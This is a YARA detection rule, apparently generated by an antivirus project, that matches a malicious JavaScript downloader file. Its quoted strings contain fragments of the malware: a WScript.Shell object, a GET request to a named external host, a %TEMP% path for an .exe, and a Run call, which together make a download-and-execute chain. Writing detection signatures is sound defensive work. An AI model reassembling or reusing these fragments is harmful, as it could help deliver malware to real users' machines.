rule sig_20160328_d075ec33412eb15f5f8c66604f4528a7 {
  meta:
    description = "datamaliciousorder - file 20160328_d075ec33412eb15f5f8c66604f4528a7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7fe2440eff54f77b27fcde8f14a90cfdf84be9132a836fe1d671fa8edffaa3a2"

  strings:
    $s1  = "function Gpcdraxnc() {return Hfpzy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"P92chKDOZuKLOR.exe\";};" fullword ascii
    $s2  = "Tzqsd[Sajyunkq](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Rybxklh](Ihdap() * 11)} while (Tzqsd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Krymfrihac(Jonflsonh, Ixyynzohuh){return Jonflsonh - Ixyynzohuh;};" fullword ascii
    $s5  = "var Hfpzy = function Jgxhn() {return WScript[Ztlpuobtp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Scqhmm(Belptdmj){Hfpzy[\"Run\"](Belptdmj, Bxpeaczf, Bxpeaczf);};" fullword ascii
    $s7  = "function Tsbyqz() {return ((Whymbvrq == true) && (Whymbvrq == Xwctmh)) ? 1 : Bxpeaczf;};" fullword ascii
    $s8  = "function Xpndl(Guwwzgyuso) {var Qyoof = (1, 2, 3, 4, 5, Guwwzgyuso); return Qyoof;};" fullword ascii
    $s9  = "Whymbvrq = true; " fullword ascii
    $s10 = "function Vdoxseveup(){return Smwzvrocmk;};" fullword ascii
    $s11 = " while (Qzdtdzkcnz){" fullword ascii
    $s12 = "var Dagxoh = new this[\"Date\"]();" fullword ascii
    $s13 = "function Ihdap(){return 22;};" fullword ascii
    $s14 = "Xwctmh = true; " fullword ascii
    $s15 = "function Rbwqamdmt(){return Ztlpuobtp;};" fullword ascii
    $s16 = "var Cqimne = false;" fullword ascii
    $s17 = "var Whymbvrq = false;" fullword ascii
    $s18 = "return Krymfrihac(Utymlgsgnl, Mrnyb);" fullword ascii
    $s19 = "var Xwctmh = false;" fullword ascii
    $s20 = "function Abqlbz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}